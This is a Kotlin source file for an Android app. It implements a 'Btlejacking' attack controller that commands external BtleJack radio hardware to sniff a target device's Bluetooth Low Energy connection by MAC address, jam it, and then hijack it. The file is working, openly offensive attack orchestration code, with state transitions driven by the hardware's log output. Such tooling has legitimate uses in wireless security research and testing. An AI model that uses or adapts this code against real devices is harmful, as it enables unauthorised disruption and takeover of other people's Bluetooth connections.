package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Enum representing the various states of a Btlejacking attack lifecycle.
 */
enum class BtlejackingState {
    IDLE,
    SNIFFING,
    JAMMING,
    HIJACKING,
    CONNECTED
}

/**
 * Module responsible for the Btlejacking attack.
 *
 * BtleJack exploits BLE connection-following to sniff, jam, and hijack active
 * BLE connections. It requires specialized hardware (e.g., nRF51822 with
 * BtleJack firmware) because standard Bluetooth chips cannot perform the
 * required sniffing and precise jamming.
 *
 * This class acts as the controller for that external hardware, sending commands
 * via the [HardwareManager] and parsing real output to determine phase transitions.
 *
 * @property hardwareManager Interface to the external radio hardware.
 */
class BtlejackingModule(private val hardwareManager: HardwareManager) {

    companion object {
        private const val TAG = "BtlejackingModule"
        private const val SNIFF_TIMEOUT_MS = 30_000L
        private const val JAM_TIMEOUT_MS = 10_000L
        private const val HIJACK_TIMEOUT_MS = 10_000L
    }

    private val _state = MutableStateFlow(BtlejackingState.IDLE)
    val state = _state.asStateFlow()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var attackJob: Job? = null

    /**
     * Phase 1: Start sniffing for the target device's connection.
     *
     * Sends the sniff command to hardware and waits for the "locked" keyword
     * in the device output, with a timeout.
     *
     * @param target The device to target.
     * @throws IllegalArgumentException if the target MAC address is invalid.
     */
    fun startSniffing(target: TargetDevice) {
        // 3.8: Validate MAC before interpolating into serial command
        MacValidator.requireValid(target.macAddress)

        // 3.4: Cancel any existing attack job before launching a new one
        attackJob?.cancel()
        attackJob = scope.launch {
            _state.value = BtlejackingState.SNIFFING
            hardwareManager.sendCommand("sniff -t ${target.macAddress}")

            // Wait for hardware to report lock-on, with timeout
            val locked = withTimeoutOrNull(SNIFF_TIMEOUT_MS) {
                hardwareManager.deviceLogs.first { logLine ->
                    logLine.contains("locked", ignoreCase = true) ||
                    logLine.contains("synchronized", ignoreCase = true) ||
                    logLine.contains("connection found", ignoreCase = true)
                }
            }

            if (locked == null) {
                _state.value = BtlejackingState.IDLE
                Log.w(TAG, "Sniffing timed out without locking onto a connection.")
                return@launch
            }

            if (_state.value == BtlejackingState.SNIFFING) {
                startJamming()
            }
        }
    }

    /**
     * Phase 2: Jam the connection to force a supervision timeout.
     *
     * Sends the jam command and waits for the hardware to confirm
     * the connection has been disrupted.
     */
    private suspend fun startJamming() {
        _state.value = BtlejackingState.JAMMING
        hardwareManager.sendCommand("jam")

        val jammed = withTimeoutOrNull(JAM_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("jammed", ignoreCase = true) ||
                logLine.contains("disconnected", ignoreCase = true) ||
                logLine.contains("timeout", ignoreCase = true)
            }
        }

        if (jammed == null) {
            _state.value = BtlejackingState.IDLE
            Log.w(TAG, "Jamming timed out without disrupting the connection.")
            return
        }

        if (_state.value == BtlejackingState.JAMMING) {
            startHijacking()
        }
    }

    /**
     * Phase 3: Hijack the connection.
     *
     * The legitimate central has disconnected due to jamming.
     * The attacker takes its place using the sniffed parameters
     * (Access Address, CRCInit, HopInterval).
     */
    private suspend fun startHijacking() {
        _state.value = BtlejackingState.HIJACKING
        hardwareManager.sendCommand("hijack")

        val hijacked = withTimeoutOrNull(HIJACK_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("hijacked", ignoreCase = true) ||
                logLine.contains("connected", ignoreCase = true) ||
                logLine.contains("takeover", ignoreCase = true)
            }
        }

        if (hijacked == null) {
            _state.value = BtlejackingState.IDLE
            Log.w(TAG, "Hijacking timed out without taking over the connection.")
            return
        }

        if (_state.value == BtlejackingState.HIJACKING) {
            _state.value = BtlejackingState.CONNECTED
            hardwareManager.sendCommand("connected")
        }
    }

    /**
     * Stops any active attack and resets the hardware.
     */
    fun stop() {
        attackJob?.cancel()
        attackJob = null
        _state.value = BtlejackingState.IDLE
        hardwareManager.sendCommand("stop")
    }

    /**
     * Releases all resources: cancels any running attack, stops hardware,
     * and cancels the coroutine scope.
     */
    fun close() {
        stop()
        scope.cancel()
    }
}
